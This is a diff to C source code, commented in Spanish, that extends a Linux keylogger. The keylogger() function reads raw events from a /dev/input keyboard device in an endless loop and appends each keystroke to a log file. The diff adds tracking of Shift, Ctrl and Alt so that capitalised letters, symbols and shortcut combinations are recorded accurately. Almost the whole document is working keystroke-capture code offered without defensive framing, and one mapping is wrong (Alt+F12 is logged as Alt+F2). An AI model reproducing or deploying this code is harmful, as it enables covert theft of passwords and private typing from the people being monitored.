@@ -73,250 +73,436 @@ int getCapsLock()
     return (state & 1);
 }
 
-// FUNCION PARA PASAR DEL CODIGO DE TECLA A LETRA
-char *getCharacter(int code)
+// Variables globales para detectar si Shift, Ctrl o Alt están presionados
+int isLeftShiftOn = 0;
+int isRightShiftOn = 0;
+int isLeftCtrlOn = 0;
+int isRightCtrlOn = 0;
+int isLeftAltOn = 0;
+int isRightAltOn = 0;
+
+// Función que actualiza el estado de las teclas modificadoras
+void updateModifierState(int code, int value)
 {
-
-    int isCapsLockOn = getCapsLock();
-
-    // printf("Caps Lock status: %d\n", isCapsLockOn);
-
     switch (code)
     {
-
-    // LETRAS
-    case KEY_A:
-        return isCapsLockOn ? "A" : "a";
-    case KEY_B:
-        return isCapsLockOn ? "B" : "b";
-    case KEY_C:
-        return isCapsLockOn ? "C" : "c";
-    case KEY_D:
-        return isCapsLockOn ? "D" : "d";
-    case KEY_E:
-        return isCapsLockOn ? "E" : "e";
-    case KEY_F:
-        return isCapsLockOn ? "F" : "f";
-    case KEY_G:
-        return isCapsLockOn ? "G" : "g";
-    case KEY_H:
-        return isCapsLockOn ? "H" : "h";
-    case KEY_I:
-        return isCapsLockOn ? "I" : "i";
-    case KEY_J:
-        return isCapsLockOn ? "J" : "j";
-    case KEY_K:
-        return isCapsLockOn ? "K" : "k";
-    case KEY_L:
-        return isCapsLockOn ? "L" : "l";
-    case KEY_M:
-        return isCapsLockOn ? "M" : "m";
-    case KEY_N:
-        return isCapsLockOn ? "N" : "n";
-    case KEY_O:
-        return isCapsLockOn ? "O" : "o";
-    case KEY_P:
-        return isCapsLockOn ? "P" : "p";
-    case KEY_Q:
-        return isCapsLockOn ? "Q" : "q";
-    case KEY_R:
-        return isCapsLockOn ? "R" : "r";
-    case KEY_S:
-        return isCapsLockOn ? "S" : "s";
-    case KEY_T:
-        return isCapsLockOn ? "T" : "t";
-    case KEY_U:
-        return isCapsLockOn ? "U" : "u";
-    case KEY_V:
-        return isCapsLockOn ? "V" : "v";
-    case KEY_W:
-        return isCapsLockOn ? "W" : "w";
-    case KEY_X:
-        return isCapsLockOn ? "X" : "x";
-    case KEY_Y:
-        return isCapsLockOn ? "Y" : "y";
-    case KEY_Z:
-        return isCapsLockOn ? "Z" : "z";
-
-        // NUMEROS
-
-    case KEY_0:
-        return "0";
-    case KEY_1:
-        return "1";
-    case KEY_2:
-        return "2";
-    case KEY_3:
-        return "3";
-    case KEY_4:
-        return "4";
-    case KEY_5:
-        return "5";
-    case KEY_6:
-        return "6";
-    case KEY_7:
-        return "7";
-    case KEY_8:
-        return "8";
-    case KEY_9:
-        return "9";
-
-    // TECLADO NUMERICO
-    case KEY_KP0:
-        return "0";
-    case KEY_KP1:
-        return "1";
-    case KEY_KP2:
-        return "2";
-    case KEY_KP3:
-        return "3";
-    case KEY_KP4:
-        return "4";
-    case KEY_KP5:
-        return "5";
-    case KEY_KP6:
-        return "6";
-    case KEY_KP7:
-        return "7";
-    case KEY_KP8:
-        return "8";
-    case KEY_KP9:
-        return "9";
-
-    // FUNCIONES ESPECIALES
-    case KEY_ENTER:
-        return "\n";
-    case KEY_SPACE:
-        return " ";
-    case KEY_DOT:
-        return ".";
-    case KEY_COMMA:
-        return ",";
-    case KEY_MINUS:
-        return "-";
-    case KEY_EQUAL:
-        return "=";
-    case KEY_SLASH:
-        return "/";
     case KEY_LEFTSHIFT:
-        return " [LEFTSHIFT] ";
+        isLeftShiftOn = value;
+        break;
     case KEY_RIGHTSHIFT:
-        return " [RIGHTSHIFT] ";
+        isRightShiftOn = value;
+        break;
     case KEY_LEFTCTRL:
-        return " [LEFTCTRL] ";
+        isLeftCtrlOn = value;
+        break;
     case KEY_RIGHTCTRL:
-        return " [RIGHTCTRL] ";
+        isRightCtrlOn = value;
+        break;
     case KEY_LEFTALT:
-        return " [LEFTALT] ";
+        isLeftAltOn = value;
+        break;
     case KEY_RIGHTALT:
-        return " [RIGHTALT] ";
-    case KEY_LEFT:
-        return " [←] ";
-    case KEY_RIGHT:
-        return " [→] ";
-    case KEY_UP:
-        return " [↑] ";
-    case KEY_DOWN:
-        return " [↓] ";
-    case KEY_ESC:
-        return " [ESC] ";
-    case KEY_TAB:
-        return " [TAB] ";
-    case KEY_CAPSLOCK:
-        return " [CAPSLOCK] ";
-    case KEY_NUMLOCK:
-        return " [NUMLOCK] ";
-    case KEY_BACKSPACE:
-        return " [BACKSPACE] ";
-    case KEY_END:
-        return " [END] ";
-    case KEY_PAGEDOWN:
-        return " [PAGEDOWN] ";
-    case KEY_INSERT:
-        return " [INSERT] ";
-    case KEY_DELETE:
-        return " [DELETE] ";
-    case KEY_PAUSE:
-        return " [PAUSE] ";
-    case KEY_HOMEPAGE:
-        return " [HOMEPAGE] ";
-    case KEY_PRINT:
-        return " [PRINT] ";
-    case KEY_F1:
-        return " [F1] ";
-    case KEY_F2:
-        return " [F2] ";
-    case KEY_F3:
-        return " [F3] ";
-    case KEY_F4:
-        return " [F4] ";
-    case KEY_F5:
-        return " [F5] ";
-    case KEY_F6:
-        return " [F6] ";
-    case KEY_F7:
-        return " [F7] ";
-    case KEY_F8:
-        return " [F8] ";
-    case KEY_F9:
-        return " [F9] ";
-    case KEY_F10:
-        return " [F10] ";
-    case KEY_F11:
-        return " [F11] ";
-    case KEY_F12:
-        return " [F12] ";
+        isRightAltOn = value;
+        break;
+    }
+}
 
-    // TECLADO NUMERICO
-    case KEY_KPENTER:
-        return "\n";
-    case KEY_KPDOT:
-        return ".";
-    case KEY_KPMINUS:
-        return "-";
-    case KEY_KPPLUS:
-        return "+";
-    case KEY_KPASTERISK:
-        return "*";
-    case KEY_KPSLASH:
-        return "/";
+// Función modificada para considerar Shift, Ctrl y Alt
+char *getCharacter(int code)
+{
+    int isCapsLockOn = getCapsLock();
+    int isShiftOn = isLeftShiftOn || isRightShiftOn; // Detectar si cualquier Shift está presionado
+    int isCtrlOn = isLeftCtrlOn || isRightCtrlOn;    // Detectar si cualquier Ctrl está presionado
+    int isAltOn = isLeftAltOn || isRightAltOn;       // Detectar si cualquier Alt está presionado
 
+    if (isCtrlOn && isAltOn)
+    {
+        switch (code)
+        {
+        case KEY_DELETE:
+            return " [Ctrl+Alt+Del] ";
+        }
+    }
+    else if (isCtrlOn)
+    {
+        switch (code)
+        {
+        case KEY_C:
+            return " [Ctrl+C] ";
+        case KEY_V:
+            return " [Ctrl+V] ";
+        case KEY_X:
+            return " [Ctrl+X] ";
+        case KEY_Z:
+            return " [Ctrl+Z] ";
+        }
+    }
+    else if (isAltOn)
+    {
+        switch (code)
+        {
+        case KEY_F1:
+            return " [Alt+F1] ";
+        case KEY_F2:
+            return " [Alt+F2] ";
+        case KEY_F3:
+            return " [Alt+F3] ";
+        case KEY_F4:
+            return " [Alt+F4] ";
+        case KEY_F5:
+            return " [Alt+F5] ";
+        case KEY_F6:
+            return " [Alt+F6] ";
+        case KEY_F7:
+            return " [Alt+F7] ";
+        case KEY_F8:
+            return " [Alt+F8] ";
+        case KEY_F9:
+            return " [Alt+F9] ";
+        case KEY_F10:
+            return " [Alt+F10] ";
+        case KEY_F11:
+            return " [Alt+F11] ";
+        case KEY_F12:
+            return " [Alt+F2] ";
+
+        case KEY_TAB:
+            return " [Alt+TAB] ";
+        }
+    }
+    else if (isShiftOn)
+    {
+        // Números y símbolos especiales con Shift
+        switch (code)
+        {
+        case KEY_1:
+            return "!";
+        case KEY_2:
+            return "@";
+        case KEY_3:
+            return "#";
+        case KEY_4:
+            return "$";
+        case KEY_5:
+            return "%";
+        case KEY_6:
+            return "^";
+        case KEY_7:
+            return "&";
+        case KEY_8:
+            return "*";
+        case KEY_9:
+            return "(";
+        case KEY_0:
+            return ")";
+        case KEY_MINUS:
+            return "_";
+        case KEY_EQUAL:
+            return "+";
+        case KEY_LEFTBRACE:
+            return "{";
+        case KEY_RIGHTBRACE:
+            return "}";
+        case KEY_BACKSLASH:
+            return "|";
+        case KEY_SEMICOLON:
+            return ":";
+        case KEY_APOSTROPHE:
+            return "\"";
+        case KEY_COMMA:
+            return "<";
+        case KEY_DOT:
+            return ">";
+        case KEY_SLASH:
+            return "?";
+        // Letras
+        case KEY_A:
+            return isCapsLockOn ? "a" : "A";
+        case KEY_B:
+            return isCapsLockOn ? "b" : "B";
+        case KEY_C:
+            return isCapsLockOn ? "c" : "C";
+        case KEY_D:
+            return isCapsLockOn ? "d" : "D";
+        case KEY_E:
+            return isCapsLockOn ? "e" : "E";
+        case KEY_F:
+            return isCapsLockOn ? "f" : "F";
+        case KEY_G:
+            return isCapsLockOn ? "g" : "G";
+        case KEY_H:
+            return isCapsLockOn ? "h" : "H";
+        case KEY_I:
+            return isCapsLockOn ? "i" : "I";
+        case KEY_J:
+            return isCapsLockOn ? "j" : "J";
+        case KEY_K:
+            return isCapsLockOn ? "k" : "K";
+        case KEY_L:
+            return isCapsLockOn ? "l" : "L";
+        case KEY_M:
+            return isCapsLockOn ? "m" : "M";
+        case KEY_N:
+            return isCapsLockOn ? "n" : "N";
+        case KEY_O:
+            return isCapsLockOn ? "o" : "O";
+        case KEY_P:
+            return isCapsLockOn ? "p" : "P";
+        case KEY_Q:
+            return isCapsLockOn ? "q" : "Q";
+        case KEY_R:
+            return isCapsLockOn ? "r" : "R";
+        case KEY_S:
+            return isCapsLockOn ? "s" : "S";
+        case KEY_T:
+            return isCapsLockOn ? "t" : "T";
+        case KEY_U:
+            return isCapsLockOn ? "u" : "U";
+        case KEY_V:
+            return isCapsLockOn ? "v" : "V";
+        case KEY_W:
+            return isCapsLockOn ? "w" : "W";
+        case KEY_X:
+            return isCapsLockOn ? "x" : "X";
+        case KEY_Y:
+            return isCapsLockOn ? "y" : "Y";
+        case KEY_Z:
+            return isCapsLockOn ? "z" : "Z";
+        }
+    }
+    else
+    {
+        // Letras minúsculas y números sin Shift
+        switch (code)
+        {
+        // LETRAS
+        case KEY_A:
+            return isCapsLockOn ? "A" : "a";
+        case KEY_B:
+            return isCapsLockOn ? "B" : "b";
+        case KEY_C:
+            return isCapsLockOn ? "C" : "c";
+        case KEY_D:
+            return isCapsLockOn ? "D" : "d";
+        case KEY_E:
+            return isCapsLockOn ? "E" : "e";
+        case KEY_F:
+            return isCapsLockOn ? "F" : "f";
+        case KEY_G:
+            return isCapsLockOn ? "G" : "g";
+        case KEY_H:
+            return isCapsLockOn ? "H" : "h";
+        case KEY_I:
+            return isCapsLockOn ? "I" : "i";
+        case KEY_J:
+            return isCapsLockOn ? "J" : "j";
+        case KEY_K:
+            return isCapsLockOn ? "K" : "k";
+        case KEY_L:
+            return isCapsLockOn ? "L" : "l";
+        case KEY_M:
+            return isCapsLockOn ? "M" : "m";
+        case KEY_N:
+            return isCapsLockOn ? "N" : "n";
+        case KEY_O:
+            return isCapsLockOn ? "O" : "o";
+        case KEY_P:
+            return isCapsLockOn ? "P" : "p";
+        case KEY_Q:
+            return isCapsLockOn ? "Q" : "q";
+        case KEY_R:
+            return isCapsLockOn ? "R" : "r";
+        case KEY_S:
+            return isCapsLockOn ? "S" : "s";
+        case KEY_T:
+            return isCapsLockOn ? "T" : "t";
+        case KEY_U:
+            return isCapsLockOn ? "U" : "u";
+        case KEY_V:
+            return isCapsLockOn ? "V" : "v";
+        case KEY_W:
+            return isCapsLockOn ? "W" : "w";
+        case KEY_X:
+            return isCapsLockOn ? "X" : "x";
+        case KEY_Y:
+            return isCapsLockOn ? "Y" : "y";
+        case KEY_Z:
+            return isCapsLockOn ? "Z" : "z";
+
+        case KEY_1:
+            return "1";
+        case KEY_2:
+            return "2";
+        case KEY_3:
+            return "3";
+        case KEY_4:
+            return "4";
+        case KEY_5:
+            return "5";
+        case KEY_6:
+            return "6";
+        case KEY_7:
+            return "7";
+        case KEY_8:
+            return "8";
+        case KEY_9:
+            return "9";
+        case KEY_0:
+            return "0";
+        case KEY_MINUS:
+            return "-";
+        case KEY_EQUAL:
+            return "=";
+        case KEY_LEFTBRACE:
+            return "[";
+        case KEY_RIGHTBRACE:
+            return "]";
+        case KEY_BACKSLASH:
+            return "\\";
+        case KEY_SEMICOLON:
+            return ";";
+        case KEY_APOSTROPHE:
+            return "'";
+        case KEY_COMMA:
+            return ",";
+        case KEY_DOT:
+            return ".";
+        case KEY_SLASH:
+            return "/";
+
+        case KEY_LEFT:
+            return " [←] ";
+        case KEY_RIGHT:
+            return " [→] ";
+        case KEY_UP:
+            return " [↑] ";
+        case KEY_DOWN:
+            return " [↓] ";
+        case KEY_ESC:
+            return " [ESC] ";
+        case KEY_TAB:
+            return " [TAB] ";
+        case KEY_END:
+            return " [END] ";
+        case KEY_PAGEDOWN:
+            return " [PAGEDOWN] ";
+        case KEY_INSERT:
+            return " [INSERT] ";
+        case KEY_DELETE:
+            return " [DELETE] ";
+        case KEY_PAUSE:
+            return " [PAUSE] ";
+        case KEY_HOMEPAGE:
+            return " [HOMEPAGE] ";
+        case KEY_PRINT:
+            return " [PRINT] ";
+        case KEY_F1:
+            return " [F1] ";
+        case KEY_F2:
+            return " [F2] ";
+        case KEY_F3:
+            return " [F3] ";
+        case KEY_F4:
+            return " [F4] ";
+        case KEY_F5:
+            return " [F5] ";
+        case KEY_F6:
+            return " [F6] ";
+        case KEY_F7:
+            return " [F7] ";
+        case KEY_F8:
+            return " [F8] ";
+        case KEY_F9:
+            return " [F9] ";
+        case KEY_F10:
+            return " [F10] ";
+        case KEY_F11:
+            return " [F11] ";
+        case KEY_F12:
+            return " [F12] ";
+
+        // TECLADO NUMERICO
+        case KEY_KPENTER:
+            return "\n";
+        case KEY_KPDOT:
+            return ".";
+        case KEY_KPMINUS:
+            return "-";
+        case KEY_KPPLUS:
+            return "+";
+        case KEY_KPASTERISK:
+            return "*";
+        case KEY_KPSLASH:
+            return "/";
+        case KEY_KP0:
+            return "0";
+        case KEY_KP1:
+            return "1";
+        case KEY_KP2:
+            return "2";
+        case KEY_KP3:
+            return "3";
+        case KEY_KP4:
+            return "4";
+        case KEY_KP5:
+            return "5";
+        case KEY_KP6:
+            return "6";
+        case KEY_KP7:
+            return "7";
+        case KEY_KP8:
+            return "8";
+        case KEY_KP9:
+            return "9";
+
+        case KEY_ENTER:
+            return "\n";
+        case KEY_SPACE:
+            return " ";
+        }
+    }
+
+    // Teclas especiales y teclas modificadoras
+    switch (code)
+    {
+    case KEY_LEFTSHIFT:
+        return "";
+    case KEY_RIGHTSHIFT:
+        return "";
+    case KEY_LEFTCTRL:
+        return "";
+    case KEY_RIGHTCTRL:
+        return "";
+    case KEY_LEFTALT:
+        return "";
+    case KEY_RIGHTALT:
+        return "";
     default:
         return "";
     }
 }
 
-// FUNCION QUE DETECTA LAS TECLAS PRESIONADAS
+// Función que detecta las teclas presionadas, modificada para considerar Ctrl y Alt
 void *keylogger()
 {
     // RUTA DEL TECLADO A COMPLETAR AUTOMATICAMENTE
     static char path_keyboard[20] = "/dev/input/";
-    // CONCATENAR EL NOMBRE DEL DEVICE
     strcat(path_keyboard, getDevice());
-    // REMOVER EL SALTO DE LINEA AL FINAL
     path_keyboard[strlen(path_keyboard) - 1] = 0;
 
-    // VARIABLE DEL EVENTO
     struct input_event event;
     ssize_t n;
 
-    // PUNTERO PARA EL ARCHIVO DE LOG TXT
     FILE *logfile;
 
-    // ABRIR EL FICHERO DEL TECLADO
     int file_device = open(path_keyboard, O_RDONLY);
-
-    // SI NO SE PUEDE ABRIR TERMINA LA FUNCION
     if (file_device == -1)
     {
         perror("No se pudo abrir el archivo de dispositivo");
         return NULL;
     }
 
-    // ABRIR EL LOG TXT (SI NO EXISTE SE CREA)
     logfile = fopen(file_path, "a");
-
-    // SI NO SE PUEDE ABRIR TERMINA LA FUNCION
     if (!logfile)
     {
         perror("No se pudo abrir el archivo de registro");
@@ -326,8 +512,6 @@ void *keylogger()
 
     time_t now;
     struct tm *local_time;
-
-    // Obtener la fecha y hora actuales
     time(&now);
     local_time = localtime(&now);
 
@@ -339,13 +523,11 @@ void *keylogger()
             local_time->tm_sec);
     fflush(logfile);
 
-    // BUCLE PARA LEER LOS EVENTOS
+    // Bucle para leer los eventos
     while (true)
     {
-        // SE LEEN LOS EVENTOS DEL TECLADO
         n = read(file_device, &event, sizeof(struct input_event));
 
-        // SI NO SE PUEDE LEER UN EVENTO TERMINA LA FUNCION
         if (n == (ssize_t)-1)
         {
             perror("Error al leer el evento");
@@ -354,12 +536,18 @@ void *keylogger()
             return NULL;
         }
 
-        // SI EL EVENTO ES UNA TECLA PRESIONADA
-        if (event.type == EV_KEY && event.value == 1)
-        { // 0 PARA CUANDO SE OPRIME LA TECLA, 1 PARA CUANDO SE SUELTA Y 2 PARA CUANDO SE MANTIENE
-            char *character = getCharacter(event.code);
-            fprintf(logfile, "%s", character);
-            fflush(logfile);
+        if (event.type == EV_KEY)
+        {
+            // Actualizar el estado de teclas modificadoras si es necesario
+            updateModifierState(event.code, event.value);
+
+            // Detectar si la tecla ha sido presionada
+            if (event.value == 1)
+            {
+                char *character = getCharacter(event.code);
+                fprintf(logfile, "%s", character);
+                fflush(logfile);
+            }
         }
     }
 
